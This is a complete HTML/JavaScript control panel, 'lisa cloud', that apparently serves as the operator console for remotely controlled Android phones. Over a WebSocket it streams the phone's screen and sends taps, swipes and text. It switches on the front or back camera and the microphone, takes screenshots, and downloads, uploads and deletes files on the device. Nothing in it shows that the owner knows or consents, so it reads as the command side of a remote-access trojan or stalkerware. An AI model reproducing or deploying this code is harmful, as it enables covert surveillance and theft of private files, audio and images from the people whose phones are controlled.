<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>lisa cloud</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
:root{--bg:#070a10;--pan:#0d121c;--ln:#1b2432;--tx:#dbe6f7;--dim:#7b8aa3;--ac:#3b82f6;--ok:#22c55e;--rd:#ef4444}
html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--tx);font-family:-apple-system,Roboto,sans-serif;font-size:14px}
#top{position:fixed;top:0;left:0;right:0;height:52px;display:flex;align-items:center;gap:8px;padding:0 12px;background:rgba(8,11,18,.95);border-bottom:1px solid var(--ln);z-index:30}
#ttl{font-size:12px;font-weight:700;letter-spacing:.14em;color:#5fa8ff;flex:1;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
#dot{font-size:10px;padding:5px 9px;border-radius:20px;background:rgba(255,255,255,.06);border:1px solid var(--ln);color:var(--dim);white-space:nowrap}
.ib{width:34px;height:34px;flex:0 0 34px;border-radius:10px;border:1px solid var(--ln);background:rgba(255,255,255,.05);color:var(--tx);font-size:15px;display:flex;align-items:center;justify-content:center;cursor:pointer}
.ib:active{background:var(--ac)}
.view{position:fixed;top:52px;left:0;right:0;bottom:0;display:none;flex-direction:column}
.view.on{display:flex}
#devs{overflow-y:auto;padding:12px}
.dev{display:flex;gap:10px;align-items:center;padding:14px 12px;border:1px solid var(--ln);border-radius:14px;background:var(--pan);margin-bottom:10px;cursor:pointer}
.dev:active{border-color:var(--ac)}
.dev .n{flex:1;font-size:14px;font-weight:600}
.dev .m{font-size:10px;color:var(--dim)}
#stage{flex:1;display:flex;align-items:center;justify-content:center;background:#000;overflow:hidden;position:relative}
#cv{max-width:100%;max-height:100%;touch-action:none;display:block}
#camimg{max-width:100%;max-height:100%;object-fit:contain}
#bar{display:flex;gap:5px;padding:8px;background:rgba(8,11,18,.97);border-top:1px solid var(--ln)}
.b{flex:1;min-width:0;height:46px;border-radius:12px;border:1px solid var(--ln);background:rgba(255,255,255,.05);color:var(--tx);font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.b:active{background:var(--ac)}
.b.on{background:var(--ok);border-color:var(--ok);color:#04240f}
#kb{display:none;gap:6px;padding:8px 10px;background:rgba(8,11,18,.98);border-top:1px solid var(--ln)}
#kb input{flex:1;padding:12px;border-radius:11px;border:1px solid var(--ln);background:rgba(0,0,0,.45);color:#fff;font-size:15px;outline:none}
#flist{flex:1;overflow-y:auto;padding:8px}
.row{display:flex;align-items:center;gap:8px;padding:11px 8px;border-radius:11px;cursor:pointer}
.row:active{background:rgba(255,255,255,.07)}
.rn{flex:1;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;font-size:13px}
.rs{font-size:10px;color:var(--dim)}
.ic{width:30px;height:30px;flex:0 0 30px;border-radius:9px;background:rgba(255,255,255,.06);display:flex;align-items:center;justify-content:center;font-size:14px}
.del{width:30px;height:30px;flex:0 0 30px;border-radius:9px;background:rgba(239,68,68,.15);color:#fca5a5;display:flex;align-items:center;justify-content:center;font-size:13px}
.del:active{background:var(--rd);color:#fff}
#fbar{display:flex;gap:6px;padding:8px;background:var(--pan);border-bottom:1px solid var(--ln)}
#fpath{flex:1;font-size:11px;color:var(--dim);align-self:center;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;direction:rtl;text-align:left}
#modal{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:60;display:none;flex-direction:column;align-items:center;justify-content:center;padding:14px}
#modal.on{display:flex}
#modal img,#modal video{max-width:100%;max-height:80%;border-radius:10px}
#modal audio{width:100%;max-width:420px}
.mname{color:var(--dim);font-size:12px;margin-bottom:10px;word-break:break-all;text-align:center}
#mclose{position:absolute;top:14px;right:14px;width:40px;height:40px;border-radius:12px;background:rgba(255,255,255,.1);border:1px solid var(--ln);color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer}
#toast{position:fixed;left:50%;transform:translateX(-50%);bottom:76px;padding:10px 16px;border-radius:12px;background:rgba(20,26,38,.97);border:1px solid var(--ln);font-size:12px;opacity:0;transition:.25s;z-index:70;pointer-events:none}
#toast.on{opacity:1}
#menu{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:55;display:none;align-items:flex-end}
#menu.on{display:flex}
#msheet{width:100%;background:var(--pan);border-radius:18px 18px 0 0;padding:14px;max-height:78vh;overflow-y:auto}
.mi{padding:13px 10px;border-radius:11px;cursor:pointer;font-size:13px}
.mi.red{color:#fca5a5}
.info{font-size:12px;line-height:1.9;color:var(--dim);padding:14px}
.info b{color:var(--tx)}
</style></head><body>

<div id=top>
  <div class=ib id=back onclick="goHome()" style="display:none">←</div>
  <div id=ttl>lisa cloud</div><div id=dot>—</div>
  <div class=ib onclick="location.reload()">⟳</div>
</div>

<div class="view on" id=home><div id=devs></div></div>

<div class=view id=screen>
  <div id=stage><canvas id=cv width=540 height=1170></canvas></div>
  <div id=kb><input id=tx placeholder="type here" autocomplete=off>
    <div class=b style="flex:0 0 54px" onclick="sendText()">↵</div></div>
  <div id=bar>
    <div class=b onclick="key('back')">◀</div>
    <div class=b onclick="key('home')">⌂</div>
    <div class=b onclick="key('recents')">▣</div>
    <div class=b onclick="key('notif')">🔔</div>
    <div class=b id=kbBtn onclick="toggleKb()">⌨</div>
    <div class=b onclick="key('del')">⌫</div>
    <div class=b onclick="key('lock')">🔒</div>
  </div>
</div>

<div class=view id=camera>
  <div id=stage><img id=camimg alt=""><div id=cammsg style="position:absolute;color:#7b8aa3;font-size:12px">loading…</div></div>
  <div id=bar>
    <div class=b id=frBtn onclick="setCam(1)">🤳 Front</div>
    <div class=b id=bkBtn onclick="setCam(0)">📷 Back</div>
    <div class=b id=micBtn onclick="toggleMic()">🎤</div>
    <div class=b onclick="shot()">📸</div>
  </div>
</div>

<div class=view id=files>
  <div id=fbar><div class=ib onclick="upDir()">⬆</div><div id=fpath>/</div>
    <div class=ib onclick="mkdir()">➕</div><label class=ib for=up>📤</label></div>
  <input id=up type=file multiple style="display:none">
  <div id=flist></div>
</div>

<div class=view id=info><div class=info id=ibody>…</div></div>

<div id=modal><div id=mclose onclick="closeModal()">✕</div><div id=mbody></div></div>
<div id=menu><div id=msheet><div id=mitems></div></div></div>
<div id=toast></div>

<script>
var TOKEN = new URLSearchParams(location.search).get('token') || '';
var ws = null, dev = null, view = '', loop = null, micOn = false, kbOn = false;
var actx = null, apos = 0, curPath = '/sdcard', curUp = '';
var camFront = 1, reqId = 1, waiting = {}, downBuf = {}, downMeta = {};
var cv = document.getElementById('cv'), cx = cv.getContext('2d'), dot = document.getElementById('dot');

function toast(m){var t=document.getElementById('toast');t.textContent=m;t.classList.add('on');
  clearTimeout(t._h);t._h=setTimeout(function(){t.classList.remove('on')},1800);}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function fmt(n){if(n<1024)return n+' B';if(n<1048576)return (n/1024).toFixed(0)+' KB';
  if(n<1073741824)return (n/1048576).toFixed(1)+' MB';return (n/1073741824).toFixed(2)+' GB';}

function connect(){
  var proto = location.protocol === 'https:' ? 'wss://' : 'ws://';
  ws = new WebSocket(proto + location.host + '/ws?role=panel&token=' + encodeURIComponent(TOKEN));
  ws.onopen = function(){ dot.textContent = '● ready'; dot.style.color = '#22c55e'; };
  ws.onclose = function(){ dot.textContent = '● offline'; dot.style.color = '#ef4444';
    setTimeout(connect, 3000); };
  ws.onmessage = onMsg;
}
connect();

function onMsg(e){
  var o; try { o = JSON.parse(e.data); } catch (x) { return; }
  if (o.t === 'devices') { renderDevs(o.list); return; }
  if (o.t === 'picked') { if (!o.ok) toast('device offline'); return; }
  if (o.t === 'frame') { if (o.cam) drawCam(o.d); else drawScr(o.d); return; }
  if (o.t === 'audio') { playPcm(o.d); return; }
  if (o.t === 'res') { var w = waiting[o.id]; if (w) { delete waiting[o.id]; w(o); } return; }
  if (o.t === 'fsdata') { onData(o); return; }
}

function renderDevs(list){
  var box = document.getElementById('devs');
  box.innerHTML = '';
  if (!list.length) { box.innerHTML = '<div class=info>কোনো ডিভাইস অনলাইন নেই…</div>'; return; }
  list.forEach(function(d){
    var el = document.createElement('div'); el.className = 'dev';
    var ic = document.createElement('div'); ic.className = 'ic'; ic.textContent = '📱';
    var n = document.createElement('div'); n.className = 'n'; n.textContent = d.name || d.id;
    var m = document.createElement('div'); m.className = 'm';
    m.textContent = (d.model ? d.model + ' · ' : '') + '🔋' + d.batt + '%';
    el.appendChild(ic); el.appendChild(n); el.appendChild(m);
    el.onclick = function(){ pick(d); };
    box.appendChild(el);
  });
}

function pick(d){
  dev = d.id;
  ws.send(JSON.stringify({ t: 'pick', dev: dev }));
  document.getElementById('ttl').textContent = d.name || d.model || 'device';
  show('screen'); poll(scr, 180);
}

function show(v){
  if (view === 'screen' && v !== 'screen') send({ t: 'cmd', cmd: 'liveoff' });
  if (view === 'camera' && v !== 'camera') {
    send({ t: 'cmd', cmd: 'camoff' });
    if (micOn) { micOn = false; send({ t: 'cmd', cmd: 'mic', on: false });
      document.getElementById('micBtn').classList.remove('on'); }
  }
  view = v;
  ['home','screen','camera','files','info'].forEach(function(i){
    document.getElementById(i).classList.toggle('on', i === v); });
  document.getElementById('back').style.display = v === 'home' ? 'none' : 'flex';
  if (loop) { clearInterval(loop); loop = null; }
}
function goHome(){ show('home'); dev = null; document.getElementById('ttl').textContent = 'lisa cloud'; }

function call(cmd, extra, cb){
  var id = reqId++;
  var o = { t: 'cmd', dev: dev, id: id, cmd: cmd };
  if (extra) for (var k in extra) o[k] = extra[k];
  if (cb) waiting[id] = cb;
  ws.send(JSON.stringify(o));
  return id;
}
function send(extra){ if (!dev) return; call(extra.cmd, extra, null); }

function poll(fn, ms){ if (loop) clearInterval(loop); loop = setInterval(fn, ms); fn(); }

/* ---- screen ---- */
function scr(){ if (dev) call('frame', { cam: 0 }, null); }
function drawScr(b64){
  var im = new Image();
  im.onload = function(){ if (cv.width !== im.naturalWidth) { cv.width = im.naturalWidth;
      cv.height = im.naturalHeight; } cx.drawImage(im, 0, 0);
    dot.textContent = '● live'; dot.style.color = '#22c55e'; };
  im.src = 'data:image/jpeg;base64,' + b64;
}

var pd = false, sx = 0, sy = 0, st = 0, moved = false;
function rel(e){ var r = cv.getBoundingClientRect();
  return { x: (e.clientX - r.left) / r.width, y: (e.clientY - r.top) / r.height }; }
cv.addEventListener('pointerdown', function(e){ e.preventDefault(); pd = true; moved = false;
  var p = rel(e); sx = p.x; sy = p.y; st = Date.now(); cv.setPointerCapture(e.pointerId); });
cv.addEventListener('pointermove', function(e){ if (!pd) return; var p = rel(e);
  if (Math.abs(p.x - sx) > .02 || Math.abs(p.y - sy) > .02) moved = true; });
cv.addEventListener('pointerup', function(e){ if (!pd) return; pd = false; var p = rel(e);
  var dt = Date.now() - st;
  if (!moved || dt < 120) call('tap', { x: p.x, y: p.y }, null);
  else call('swipe', { x1: sx, y1: sy, x2: p.x, y2: p.y, ms: Math.min(600, Math.max(120, dt)) }, null); });

function toggleKb(){ kbOn = !kbOn; document.getElementById('kb').style.display = kbOn ? 'flex' : 'none';
  document.getElementById('kbBtn').classList.toggle('on', kbOn);
  if (kbOn) document.getElementById('tx').focus(); }
function sendText(){ var i = document.getElementById('tx');
  if (i.value.length) { call('text', { v: i.value }, null); i.value = ''; } }
document.getElementById('tx').addEventListener('keydown', function(e){
  if (e.key === 'Enter') { e.preventDefault(); sendText(); } });
function key(k){ call('key', { k: k }, null); }

/* ---- camera ---- */
function openCam(){ show('camera'); setCam(1); }
function setCam(f){ camFront = f;
  document.getElementById('frBtn').classList.toggle('on', f === 1);
  document.getElementById('bkBtn').classList.toggle('on', f === 0);
  poll(cam, 220); }
function cam(){ if (dev) call('frame', { cam: 1, front: camFront }, null); }
function drawCam(b64){ document.getElementById('camimg').src = 'data:image/jpeg;base64,' + b64;
  document.getElementById('cammsg').style.display = 'none'; }

function toggleMic(){
  micOn = !micOn; document.getElementById('micBtn').classList.toggle('on', micOn);
  call('mic', { on: micOn }, null);
  if (micOn) { if (!actx) try { actx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 }); } catch (e) {}
    if (actx && actx.state === 'suspended') actx.resume(); poll(mic, 250); }
  else { if (loop) clearInterval(loop); loop = null; }
}
function mic(){ if (dev) call('audio', null, null); }
function playPcm(b64){ try { if (!actx || !b64) return;
  var bin = atob(b64), n = bin.length >> 1; if (!n) return;
  var f32 = new Float32Array(n);
  for (var i = 0; i < n; i++) {
    var lo = bin.charCodeAt(i * 2), hi = bin.charCodeAt(i * 2 + 1);
    var v = (hi << 8) | lo; if (v > 32767) v -= 65536;
    f32[i] = v / 32768;
  }
  var buf = actx.createBuffer(1, n, 16000); buf.copyToChannel(f32, 0);
  var src = actx.createBufferSource(); src.buffer = buf; src.connect(actx.destination);
  var now = actx.currentTime; if (apos < now) apos = now; src.start(apos); apos += buf.duration;
} catch (e) {} }

/* ---- screenshot / modal ---- */
function shot(){ toast('screenshot…');
  call('shot', null, function(r){ if (r.ok && r.data && r.data.img) showModal('<img src="data:image/png;base64,' + r.data.img + '">');
    else toast('failed'); }); }
function showModal(h){ document.getElementById('mbody').innerHTML = h;
  document.getElementById('modal').classList.add('on'); }
function closeModal(){ document.getElementById('modal').classList.remove('on');
  document.getElementById('mbody').innerHTML = ''; }

/* ---- files ---- */
function openFiles(){ show('files'); load(curPath || '/sdcard'); }

function load(p){
  call('fs', { op: 'list', p: p || '' }, function(r){
    if (!r.ok || !r.data) { toast('cannot open'); return; }
    curPath = r.data.path; curUp = r.data.up || '';
    document.getElementById('fpath').textContent = curPath;
    var box = document.getElementById('flist'); box.innerHTML = '';
    if (!r.data.items.length) { box.innerHTML = '<div class=row><div class=rn>empty folder</div></div>'; return; }
    r.data.items.forEach(function(it){
      var row = document.createElement('div'); row.className = 'row';
      var ic = document.createElement('div'); ic.className = 'ic';
      ic.textContent = it.d ? '📁' : (it.i ? '🖼' : (it.v ? '🎬' : (it.a ? '🎵' : '📄')));
      var nm = document.createElement('div'); nm.className = 'rn'; nm.textContent = it.n;
      var sz = document.createElement('div'); sz.className = 'rs'; sz.textContent = it.d ? '' : fmt(it.s);
      var del = document.createElement('div'); del.className = 'del'; del.textContent = '🗑';
      del.onclick = function(ev){ ev.stopPropagation(); delIt(it); };
      row.appendChild(ic); row.appendChild(nm); row.appendChild(sz); row.appendChild(del);
      row.onclick = function(){ if (it.d) load(curPath + '/' + it.n); else fileMenu(it); };
      box.appendChild(row);
    });
  });
}

function delIt(it){
  if (!confirm((it.d ? 'Delete folder ' : 'Delete ') + it.n + ' ?')) return;
  call('fs', { op: 'del', p: curPath + '/' + it.n }, function(r){
    toast(r.ok ? 'deleted' : 'failed'); if (r.ok) load(curPath); });
}

function upDir(){ if (curUp) load(curUp); }
function mkdir(){ var n = prompt('folder name'); if (!n) return;
  call('fs', { op: 'mkdir', p: curPath, n: n }, function(){ load(curPath); }); }

function play(it){
  var p = curPath + '/' + it.n;
  toast('loading…');
  call('fs', { op: 'get', p: p }, function(r){
    if (!r.ok || !downBuf[r.id]) { toast('failed'); return; }
    var blob = new Blob([downBuf[r.id]], { type: downMeta[r.id] || 'application/octet-stream' });
    var u = URL.createObjectURL(blob);
    var h = '<div class=mname>' + esc(it.n) + '</div>';
    if (it.v) h += '<video src="' + u + '" controls autoplay playsinline></video>';
    else if (it.a) h += '<audio src="' + u + '" controls autoplay></audio>';
    else h += '<img src="' + u + '">';
    showModal(h);
  });
}

function fileMenu(it){
  var m = document.getElementById('mitems'); m.innerHTML = '';
  function add(l, fn, red){ var d = document.createElement('div');
    d.className = 'mi' + (red ? ' red' : ''); d.textContent = l;
    d.onclick = function(){ document.getElementById('menu').classList.remove('on'); fn(); };
    m.appendChild(d); }
  if (it.i || it.v || it.a) add('👁 Open', function(){ play(it); });
  add('⬇ Download', function(){ download(it); });
  add('🗑 Delete', function(){ delIt(it); }, true);
  add('✏ Rename', function(){ var n = prompt('new name', it.n); if (!n) return;
    call('fs', { op: 'rename', p: curPath + '/' + it.n, n: n }, function(){ load(curPath); }); });
  add('✂ Move to…', function(){ var d = prompt('destination folder', '/sdcard'); if (!d) return;
    call('fs', { op: 'move', p: curPath + '/' + it.n, d: d }, function(){ load(curPath); }); });
  add('📋 Copy here', function(){ call('fs', { op: 'copy', p: curPath + '/' + it.n, d: curPath },
    function(){ load(curPath); }); });
  add('🗜 Zip', function(){ call('fs', { op: 'zip', p: curPath + '/' + it.n },
    function(r){ toast(r.ok ? 'zipped' : 'failed'); if (r.ok) load(curPath); }); });
  document.getElementById('menu').classList.add('on');
}

function download(it){
  var p = curPath + '/' + it.n;
  toast('downloading…');
  call('fs', { op: 'get', p: p }, function(r){
    if (!r.ok || !downBuf[r.id]) { toast('failed'); return; }
    var blob = new Blob([downBuf[r.id]], { type: 'application/octet-stream' });
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob); a.download = it.n; a.click();
    toast('saved ' + it.n);
  });
}

/* upload: 128 KB chunk, base64 */
document.getElementById('up').addEventListener('change', function(e){
  var fs = Array.prototype.slice.call(e.target.files); if (!fs.length) return;
  var dest = curPath;
  (function next(i){
    if (i >= fs.length) { toast('upload finished'); load(dest); e.target.value = ''; return; }
    var f = fs[i], off = 0;
    call('fs', { op: 'put', p: dest, n: f.name, size: f.size }, function(){
      (function chunk(){
        if (off >= f.size) {
          call('fs', { op: 'putend' }, function(){ next(i + 1); });
          return;
        }
        var slice = f.slice(off, Math.min(off + 131072, f.size));
        off += slice.size;
        var fr = new FileReader();
        fr.onload = function(){
          var b = fr.result, bin = '', u = new Uint8Array(b);
          for (var k = 0; k < u.length; k++) bin += String.fromCharCode(u[k]);
          call('fs', { op: 'putchunk', d: btoa(bin) }, function(){
            toast('↑ ' + Math.round(off * 100 / f.size) + '% · ' + f.name);
            chunk();
          });
        };
        fr.readAsArrayBuffer(slice);
      })();
    });
  })(0);
});

function onData(o){
  if (o.eof) {
    var w = waiting[o.id];
    if (w) { delete waiting[o.id]; w({ ok: true, id: o.id }); }
    return;
  }
  if (!downBuf[o.id]) downBuf[o.id] = [];
  downBuf[o.id].push(Uint8Array.from(atob(o.d), function(c){ return c.charCodeAt(0); }));
}

/* ---- info ---- */
function openInfo(){ show('info');
  call('info', null, function(r){
    if (!r.ok || !r.data) { document.getElementById('ibody').textContent = 'failed'; return; }
    var d = r.data;
    document.getElementById('ibody').innerHTML =
      '<b>Model</b><br>' + esc(d.model) + '<br><br><b>Brand</b><br>' + esc(d.brand) +
      '<br><br><b>Android</b><br>' + esc(d.android) + '<br><br><b>Battery</b><br>' + d.batt +
      '%<br><br><b>Storage free</b><br>' + esc(d.storage) + '<br><br><b>Time</b><br>' + esc(d.time);
  });
}

document.getElementById('menu').addEventListener('click', function(e){
  if (e.target.id === 'menu') document.getElementById('menu').classList.remove('on');
});
</script></body></html>
